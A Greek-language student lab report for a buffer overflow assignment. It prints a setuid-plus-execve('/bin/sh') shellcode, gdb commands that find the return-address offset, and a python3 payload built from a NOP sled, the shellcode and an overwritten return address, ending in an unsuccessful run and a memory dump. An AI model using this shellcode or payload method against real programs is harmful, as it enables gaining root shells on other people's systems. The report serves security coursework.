Assignment 8

Κωνσταντίνος Δανόπουλος 2016030131


Για την επίλυση της άσκησης έψαξα στο ίντερνετ ώστε να βρω ένα κατάλληλο shellcode το οποίο να μπορεί να το τρέχει ο υπολογιστής μου με βάση στον συγκεκριμένο επεξεργαστή που έχω. Το shellcode αυτό είναι το εξής : 

\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh

το οποίο στην συνέχεια το μετέτρεψα σε :

\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68

Το size του γενικά είναι πολύ μεγάλο (53) αλλά παρόλο που δοκίμασα πάρα πολλά shellcode στο shellstorm κανένα δεν έτρεχε στον υπολογιστή μου.Όλα έβγαζαν segmatation fault. Για να μπορώ να τρέχω και να δοκιμάζω τα shellcode χρησιμοποίησα τον κώδικα στο αρχείο test.c που σας επισυνάπτω στην εργασία μου (αλλάζοντας κάθε φορά το shellcode).

 Στην συνέχεια εφόσον βρήκα το κατάλληλο shellcode επειδή ήταν πολύ μεγάλο το μέγεθός του και δεν χώραγε στον 32 buffer και έκανε overflow μονο με το shellcode χρειάστηκε να μετατρέψω τον buffer σε 90 μέγεθος. Αρχικά για να υπολογίσω το πόσα στοιχεία πρέπει να γράψω στον buffer ώστε να επαναγράψω το return address έκανα δοκιμές εισάγωντας "\x41" όπου είναι σε ascii το γράμμα A. Για να γεμίσω "ακριβώς" το return address χρειάστηκε να εισάγω : 
 110 φορές το "\x41" ώστε μέσω του gdb να μου βγάλει segmatation fault με return adress το :

 0x41414141 in ?? ()  

 Κώδικας (εντός του gdb): run < <(python3 -c 'print("\x41"*110)') 

 Οπότε στην συνέχεια έπρεπε να τοποθετήσω το shellcode που γνωρίζω ότι σίγουρα τρέχει εντός του buffer όπου πριν τον κώδικα έχω γεμίσει την μνήμη με 
 "\x90" που είναι η εντολή Do nothing. Ουσιαστικά λέει στον επεργαστή, απλά προσπέρνα αυτήν την θέση και πήγαινε στην επόμενη. Θα χρησιμποιήσουμε ένα μονοπάτι που αποτελείται από "\x90" που θα οδηγούν τον επεξεργαστή απευθείας στο shellcode μας αντικαθιστώντας το return adress να δείχνει σε κάποιο από αυτά τα "\x90" που είναι πριν το shellcode. 

 Στον δικό μου υπολογιστή όταν πρόσθετα "\x90" δεν έπιανε 2 θέσεις μνήμης όπως με το "\x41". Σε εμένα έπιανε 4 θέσεις μνήμης γράφοντας : "c290" κάθε φορά που τοποθετούσα ένα "\x90". Οπότε έπρεπε να τοποθετώ τα μισά "\x90" σε σχέση με τα "\x41" που θα έπρεπε κανονικά να τοποθετήσω. Μετά από πολλές δοκιμές κατέληξα στον εξής κώδικα : 

 run < <(python3 -c 'print("\x41"+"\x90"*8+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"+"\x90"+"\x6a\xcf\xff\xff"*3)')

 όπου "\x6a\xcf\xff\xff" είναι η θέση μνήμης στον υπολογιστή μου που είναι τοποθετημένα τα "\x90" που οδηγούν στον shellcode.
 Τρέχοντας τον παραπάνω κώδικα το πρόγραμμα μου σκάει και ώς αποτέλεσμα βλέπω το εξής :

 Program received signal SIGSEGV, Segmentation fault.
 0xc38fc36a in ?? ()

 Έψαξα στις θέσεις μνήμης (εντολή = x/200x ($esp - 550) ) αλλά δεν υπάρχει κάπου γραμμένη αυτή η θέση μνήμης. Οπότε υποθέτω ότι τρέχει το shellcode αλλά υπάρχει κάποιο πρόβλημα με την εκτέλεσή του. Έκανα πολλές μετατροπές του κώδικα αλλά δεν κατέληξα σε διαφορετικό αποτέλεσμα...

 Αποτέλεσμα εντολής x/200x ($esp - 550)

0xffffcefa:	0x85cd080e	0x53000805	0xcf63080e	0xffffffff
0xffffcf0a:	0x000a7fff	0x00000000	0x03540000	0x93300000
0xffffcf1a:	0x0013080e	0x00000000	0x00000000	0x000000c3
0xffffcf2a:	0x54340000	0x51c0080e	0x000a080e	0xcfb80000
0xffffcf3a:	0x5000ffff	0x5000080e	0x5000080e	0xcfc8080e
0xffffcf4a:	0x9dc7ffff	0xcf620804	0x9330ffff	0x0013080e
0xffffcf5a:	0x9db50000	0x5f360804	0xc290c241	0xc290c290
0xffffcf6a:	0xc290c290	0xc290c290	0x80c33190	0xc29bc331
0xffffcf7a:	0x8dc317b0	0xabc380c2	0x89c25e1f	0xc3310876
0xffffcf8a:	0x4688c280	0x4689c207	0x0bb0c20c	0xb3c389c2
0xffffcf9a:	0x084e8dc2	0x0c568dc2	0x80c28dc3	0xc29bc331
0xffffcfaa:	0x4098c389	0x80c28dc3	0x9cc3a8c3	0xbfc3bfc3
0xffffcfba:	0x0080bfc3	0x732f0000	0x6a90c268	0xbfc38fc3
0xffffcfca:	0xc36abfc3	0xc3bfc38f	0x8fc36abf	0xbfc3bfc3
0xffffcfda:	0xa6ed0000	0x50000804	0x5000080e	0x5000080e
0xffffcfea:	0xa6ed080e	0x00010804	0xd0a40000	0xd0acffff
0xffffcffa:	0xd040ffff	0x0000ffff	0x00000000	0x00000000
0xffffd00a:	0x50000000	0x0000080e	0x00060000	0x003d0000
0xffffd01a:	0x00040000	0x00300000	0x00000000	0x00000000
0xffffd02a:	0x00000000	0x00000000	0x00000000	0x00000000




